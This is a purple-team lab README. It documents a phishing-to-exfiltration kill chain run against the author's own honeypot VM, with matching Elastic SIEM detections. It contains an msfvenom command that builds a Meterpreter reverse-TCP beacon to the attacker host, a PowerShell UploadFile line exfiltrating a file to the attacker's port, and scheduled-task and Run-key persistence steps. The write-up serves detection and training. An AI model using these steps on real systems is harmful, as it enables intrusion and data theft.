# Purple Team — Phishing to Exfiltration Campaign Lab

> **⚠️ Authorized, controlled lab.** This documents a red-team → blue-team exercise I ran
> in an **isolated home environment** against a **Windows 11 honeypot VM I own**.
> Nothing here targeted a third party. The value of this project is on the **detection side**:
> every attack stage is paired with the **real SIEM telemetry** that caught it, and the exact
> queries to find it. Treat the "how to do it" as context; the "how to catch it" is the point.

A full-kill-chain engagement: **Phish → Execute → C2 → Escalate → Persist → Exfiltrate**,
documented end-to-end with the actual Elastic Security events that prove each step happened.

---

## The environment

| Role | Machine | Notes |
|---|---|---|
| **Victim** | `HONEYPOT` — Windows 11 24H2 VM (`192.168.254.128`) | Honeypot, user `honey` (filtered local admin), Elastic endpoint agent |
| **Attacker host** | Windows box on VMnet8 (`192.168.254.100`) | Serves the payload, relays C2, catches the exfil |
| **Operator** | Kali Linux (WSL2, mirrored) | `msfvenom` + `msfconsole` |
| **SIEM** | Elastic Security 9.x (`siem.example.com:9200`) | Where all victim telemetry streams in |

**One attacker IP, three jobs:**

```
:8080  serve the payload    (the "shop window")
:4443  C2 command channel    (the "phone line" — beacon dials OUT)
:4444  exfil data channel    (the "loading dock" — file goes out)
```

See [`lab/lab-architecture.md`](lab/lab-architecture.md) and [`assets/lab-architecture.png`](assets/lab-architecture.png).

---

## The kill chain (6 stages)

| # | Stage | Technique (MITRE) | Real proof in the SIEM |
|---|---|---|---|
| 1 | **Phish** | T1566.001 — Phishing: Attachments | Work-looking "Year-End Showcase" PDF, RSVP link → `…:8080/office_update.exe` |
| 2 | **Execute** | T1204.002 — User Execution | `office_update.exe` launched from `Downloads`; Elastic Defend **critical** memory-signature alert (`shellcode_thread`) |
| 3 | **C2** | T1071.001 — Web traffic | Egress `192.168.254.128 → 192.168.254.100:4443` from an **unsigned** `office_update.exe` running out of `Downloads` |
| 4 | **Escalate** | T1548 / T1055 — UAC + migration | `whoami` Medium → `NT AUTHORITY\SYSTEM` via `-Verb RunAs`, then `migrate` into `svchost` |
| 5 | **Persist** | T1053.005 + T1547.001 | `schtasks /create` (TaskCache registry write) **+** `HKLM\…\Run` key — **both** verified |
| 6 | **Exfil** | T1041 — Exfil over C2 | `PowerShell UploadFile('http://…:4444', 'C:\Users\honey\…\secret.txt')` logged by EID 4104 |

Each stage is written up in [`lab/stages/`](lab/stages/).

---

## The payload, explained

`office_update.exe` is a **256 KB single-stage Meterpreter reverse-TCP beacon** built with:

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.254.100 LPORT=4443 -f exe -o office_update.exe
```

Dissected (SHA256 `77428ca3…af774`):

- Valid **PE32+ / AMD64** executable — looks like a normal `.exe`
- `.text` (50 B) — the tiny **stager** bootstrap
- `.qbhc` (**249,000 B, ~97% of the file**) — the **XOR-encoded Meterpreter agent**; the whole `shell`/`migrate`/`download` toolkit lives here, scrambled
- The callback `192.168.254.100:4443` is **not** stored as plain text — it's decoded **in RAM at runtime**

**Why it matters for defenders:** a static file scan sees opaque bytes. The reliable detection is the **runtime behavior** — an unsigned, "office"-named binary running from a user's `Downloads` folder phoning out to a fixed IP:port on egress. Five independent red flags in a single network event.

The persistence stage **copies** this same file to `C:\ProgramData\WinUpdate\wu_service.exe` (same bytes, native-looking name) and points a scheduled task + Run key at it. It survives a reboot with **no human action** — verified by a beacon re-connecting after an unattended reboot.

---

## 🎯 Detection (the actually useful part)

**[`detections/kql.md`](detections/kql.md)** — every query is **bar-verified against the live SIEM** during the lab. Highlights:

- **Beacon C2:** `host.name: "honeypot" AND destination.port: 4443` → the egress calls
- **Persistence planted:** `registry.value: "WinUpdateSvc"` OR `process.name: "schtasks.exe"` → TaskCache + Run-key writes
- **Exfil:** `powershell.file.script_block_text: "UploadFile"` → the exact `secret.txt → :4444` scriptblock
- **The 6 columns that identify a beacon** in any network event
- **The detection gap:** nothing was hidden — the fix is a *correlation* rule (process `schtasks`/`UploadFile` → network to attacker IP), not evasion

**[`detections/correlation.md`](detections/correlation.md)** — the EQL sequences that close the gap.

---

## Artifacts

- [`assets/CAMPAIGN_DECK.pptx`](assets/CAMPAIGN_DECK.pptx) — the presentation
- [`assets/STAGE2_INCIDENT_REPORT.pdf`](assets/STAGE2_INCIDENT_REPORT.pdf) — the incident report
- [`assets/Year-End_Showcase_Invitation_v2.pdf`](assets/Year-End_Showcase_Invitation_v2.pdf) — the phish (harmless: its only action is an HTTP link to the lab subnet)
- [`assets/*.png`](assets/) — terminal & UI captures used in the deck
- [`lab/`](lab/) — sanitized working files (relay + exfil listener with IP placeholders)

---

## Replicating the lab (bring your own infra)

1. Build an isolated VM (Windows 11) + an attacker box + a SIEM with the Elastic endpoint agent.
2. Generate the beacon with `msfvenom` (see above) pointing at *your* subnet.
3. Run the stages in order; pull telemetry with the queries in `detections/kql.md`.

All scripts in [`lab/`](lab/) use `ATTACKER_IP` / `VICTIM_IP` placeholders — set them to your own.
Point the ES queries at your own cluster and credentials.

---

*Purple team, not a weapon: the goal was to understand how a phishing-to-exfil campaign looks in
real telemetry and — more importantly — how to catch it faster.*
